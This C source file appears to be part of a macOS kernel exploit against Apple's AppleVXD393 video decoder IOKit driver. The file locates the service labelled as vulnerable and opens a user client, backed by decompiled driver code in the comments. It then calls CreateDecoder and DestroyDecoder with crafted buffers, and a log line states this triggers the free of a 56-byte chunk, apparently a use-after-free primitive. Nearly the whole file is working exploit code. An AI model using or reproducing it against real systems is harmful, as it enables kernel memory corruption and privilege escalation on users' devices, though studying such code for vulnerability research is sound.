#include <mach/mach.h>
#include "applevxd393.h"
#include "helper.h"
#include "iokit.h"

int open_connection_to_applevxd393(io_connect_t *userclient_connection)
{
    kern_return_t ret;
    io_connect_t connection;
    mach_port_t master_port;
    io_iterator_t service_iterator;
    io_name_t service_name;
    io_service_t service;

    ret = 0;
    connection = 0;
    master_port = 0;
    service_iterator = 0;

    ret = host_get_io_master(mach_host_self(), &master_port);
    if (KERN_SUCCESS != ret)
    {
        ERROR_LOG("Failed Getting Master Port");
        goto out;
    }

    ret = IOServiceGetMatchingServices(master_port,
                       IOServiceMatching(IOKIT_ALL_SERVICES),
                       &service_iterator);
    if (ret != KERN_SUCCESS)
    {
        ERROR_LOG("Failed Getting Matching Services");
	ret = 1;
        goto out;
    }

    while(IOIteratorIsValid(service_iterator) &&
	  (service = IOIteratorNext(service_iterator)))
    {
	ret = IORegistryEntryGetName(service, service_name);
	if (ret != KERN_SUCCESS)
	{
	    /* ERROR_LOG("Error retrieving name"); */
	    continue;
	}

	if (strcmp(service_name, IOKIT_VULNERABLE_SERVICE) == 0)
	{
	    DEBUG_LOG("Found %s", IOKIT_VULNERABLE_SERVICE);
	    // type == 1 needed by AppleVXD393 according to AppleVXD393::new_client
	    //
	    // Ghidra Decompiler:
	    // /* AppleVXD393::newUserClient(task*, void*, unsigned int, IOUserClient**) */
	    //
	    // undefined8 __thiscall
	    // newUserClient(AppleVXD393 *this,task *owningTask,void *securityID,uint type,
	    //               IOUserClient **outUserClient)
	    // {
	    //   IOUserClient *userClient;
	    //   ulonglong uVar1;
	    //   task *ptVar2;
	    //   undefined8 ret;
	    //   ulonglong counter;
	    //
	    //   ret = 0xe00002bc;
	    //   *outUserClient = NULL;
	    //   if (type == 1) {
	    //     ptVar2 = owningTask;
	    //     _IOLockLock(this->iolock);
	    //   ,,,
	    // }
	    // else {
	    //                   /* Unsupported Function */
	    //   ret = 0xe00002c7;
	    // }
	    ret = IOServiceOpen(service, mach_task_self(), 1, &connection);
	    if (ret != KERN_SUCCESS || !MACH_PORT_VALID(connection))
	    {
		ERROR_LOG("Error Opening Service %s", service_name);
		ret = 1;
		goto out;
	    }
	    else
	    {
		DEBUG_LOG("Successfully Opened %s", service_name);
		break;
	    }
	}
    }

    if (connection == 0)
    {
        ERROR_LOG("Service %s Not Found!", IOKIT_VULNERABLE_SERVICE);
        ret = 1;
	goto out;
    }

    ret = 0;

out:
    if (!ret)
	*userclient_connection = connection;
    else
	ERROR_LOG2("Could Not Create Client Connection To %s", IOKIT_VULNERABLE_SERVICE);

    if (service_iterator)
    {
	IOObjectRelease(service_iterator);
    }
    return ret;
}

int create_decoder(io_connect_t *userclient_connection, uint32_t *surface_id)
{
    kern_return_t ret;
    size_t create_dec_input_buffer_size;
    size_t create_dec_output_buffer_size;
    char create_dec_input_buffer[CREATE_DECODER_INPUT_SIZE];
    char create_dec_output_buffer[CREATE_DECODER_OUTPUT_SIZE];

    create_dec_input_buffer_size = CREATE_DECODER_INPUT_SIZE;
    create_dec_output_buffer_size = CREATE_DECODER_OUTPUT_SIZE;

    bzero(create_dec_input_buffer, create_dec_input_buffer_size);
    bzero(create_dec_output_buffer, create_dec_output_buffer_size);

    memcpy(&create_dec_input_buffer[0x90], surface_id, sizeof(uint32_t));
    DEBUG_LOG2("IOSurface ID: %d", create_dec_input_buffer[0x90]);
    create_dec_input_buffer[0x10] = 1;

    ret = IOConnectCallStructMethod(*userclient_connection,
				    CREATE_DECODER,
				    (void *)create_dec_input_buffer,
				    create_dec_input_buffer_size,
				    (void *)create_dec_output_buffer,
				    &create_dec_output_buffer_size);
    if (ret != KERN_SUCCESS)
    {
	ERROR_LOG("Call To CreateDecoder Failed: %x", ret);
	return 1;
    }
    else
    {
	DEBUG_LOG("Call To CreateDecoder Successful");
    }

    return 0;
}

int destroy_decoder(io_connect_t *userclient_connection)
{
    kern_return_t ret;
    size_t destroy_dec_input_buffer_size, destroy_dec_output_buffer_size;
    char destroy_dec_input_buffer[DESTROY_DECODER_INPUT_SIZE];
    char destroy_dec_output_buffer[DESTROY_DECODER_OUTPUT_SIZE];

    destroy_dec_input_buffer_size = DESTROY_DECODER_INPUT_SIZE;
    destroy_dec_output_buffer_size = DESTROY_DECODER_OUTPUT_SIZE;

    bzero(destroy_dec_input_buffer, destroy_dec_input_buffer_size);
    bzero(destroy_dec_output_buffer, destroy_dec_output_buffer_size);

    ret = IOConnectCallStructMethod(*userclient_connection,
				    DESTROY_DECODER,
				    (void *)destroy_dec_input_buffer,
				    destroy_dec_input_buffer_size,
				    (void *)destroy_dec_output_buffer,
				    &destroy_dec_output_buffer_size);
    if (ret != KERN_SUCCESS)
    {
	ERROR_LOG("Call To DestroyDecoder Failed: %x", ret);
	return 1;
    }
    else
    {
	DEBUG_LOG("Call To DestroyDecoder Successful");
	DEBUG_LOG("Triggered Free Of 56 Byte Chunk");
    }

out:
    return 0;
}
